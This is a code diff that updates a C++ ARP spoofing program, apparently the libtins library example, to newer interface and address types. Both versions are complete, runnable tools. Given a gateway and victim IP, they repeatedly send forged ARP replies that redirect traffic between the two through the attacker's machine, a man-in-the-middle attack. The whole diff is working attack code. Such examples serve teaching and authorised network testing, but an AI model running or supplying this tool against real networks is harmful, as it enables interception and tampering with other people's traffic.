@@ -22,9 +22,10 @@
 
 #include <iostream>
 #include <string>
-#include <stdint.h>
+#include <stdexcept>
 #include <cstdlib>
 #include <tins/arp.h>
+#include <tins/network_interface.h>
 #include <tins/utils.h>
 #include <tins/ethernetII.h>
 
@@ -32,30 +33,32 @@ using namespace std;
 using namespace Tins;
 
 
-int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint32_t victim, uint32_t own_ip, uint8_t *own_hw) {
+int do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim, 
+  const NetworkInterface::Info &info) 
+{
     PacketSender sender;
-    uint8_t gw_hw[6], victim_hw[6];
+    EthernetII::address_type gw_hw, victim_hw;
     
     // Resolves gateway's hardware address.
-    if(!Utils::resolve_hwaddr(iface_name, gw, gw_hw, &sender)) {
+    if(!Utils::resolve_hwaddr(iface, gw, &gw_hw, &sender)) {
         cout << "Could not resolve gateway's ip address.\n";
         return 5;
     }
     
     // Resolves victim's hardware address.
-    if(!Utils::resolve_hwaddr(iface_name, victim, victim_hw, &sender)) {
+    if(!Utils::resolve_hwaddr(iface, victim, &victim_hw, &sender)) {
         cout << "Could not resolve victim's ip address.\n";
         return 6;
     }
     // Print out the hw addresses we're using.
-    cout << " Using gateway hw address: " << Utils::hwaddr_to_string(gw_hw) << "\n";
-    cout << " Using victim hw address:  " << Utils::hwaddr_to_string(victim_hw) << "\n";
-    cout << " Using own hw address:     " << Utils::hwaddr_to_string(own_hw) << "\n";
+    cout << " Using gateway hw address: " << gw_hw << "\n";
+    cout << " Using victim hw address:  " << victim_hw << "\n";
+    cout << " Using own hw address:     " << info.hw_addr << "\n";
     
     /* We tell the gateway that the victim is at out hw address,
      * and tell the victim that the gateway is at out hw address */
-    ARP *gw_arp     = new ARP(gw, victim, gw_hw, own_hw), 
-        *victim_arp = new ARP(victim, gw, victim_hw, own_hw);
+    ARP *gw_arp     = new ARP(gw, victim, gw_hw, info.hw_addr), 
+        *victim_arp = new ARP(victim, gw, victim_hw, info.hw_addr);
     // We are "replying" ARP requests
     gw_arp->opcode(ARP::REPLY);
     victim_arp->opcode(ARP::REPLY);
@@ -64,8 +67,8 @@ int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint3
      * We include our hw address as the source address
      * in ethernet layer, to avoid possible packet dropping
      * performed by any routers. */
-    EthernetII to_gw(iface, gw_hw, own_hw, gw_arp);
-    EthernetII to_victim(iface, victim_hw, own_hw, victim_arp);
+    EthernetII to_gw(iface, gw_hw, info.hw_addr, gw_arp);
+    EthernetII to_victim(iface, victim_hw, info.hw_addr, victim_arp);
     while(true) {
         // Just send them once every 5 seconds.
         if(!sender.send(&to_gw) || !sender.send(&to_victim))
@@ -77,31 +80,31 @@ int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint3
 int main(int argc, char *argv[]) {
     if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
         return 1;
-    uint32_t gw, victim, own_ip;
-    uint8_t own_hw[6];
+    IPv4Address gw, victim;
+    EthernetII::address_type own_hw;
     try {
         // Convert dotted-notation ip addresses to integer. 
-        gw     = Utils::ip_to_int(argv[1]);
-        victim = Utils::ip_to_int(argv[2]);
+        gw     = argv[1];
+        victim = argv[2];
     }
     catch(...) {
         cout << "Invalid ip found...\n";
         return 2;
     }
     
-    // Get the interface which will be the gateway for our requests.
-    string iface = Utils::interface_from_ip(gw);
-    cout << iface << "\n";
-    uint32_t iface_index;
-    // Lookup the interface id. This will be required while forging packets.
-    if(!Utils::interface_id(iface, iface_index) && cout << "Interface " << iface << " does not exist!\n")
-        return 3;
-    // Find the interface hardware and ip address.
-    if(!Utils::interface_hwaddr(iface, own_hw) || !Utils::interface_ip(iface, own_ip)) {
-        cout << "Error fetching addresses from " << iface << "\n";
-        return 4;
+    NetworkInterface iface;
+    NetworkInterface::Info info;
+    try {
+        // Get the interface which will be the gateway for our requests.
+        iface = gw;
+        // Lookup the interface id. This will be required while forging packets.
+        // Find the interface hardware and ip address.
+        info = iface.addresses();
     }
-    // Poison ARP tables :D
-    return do_arp_spoofing(iface_index, iface, gw, victim, own_ip, own_hw);
+    catch(std::runtime_error &ex) {
+        cout << ex.what() << endl;
+        return 3;
+    }
+    return do_arp_spoofing(iface, gw, victim, info);
 }
 
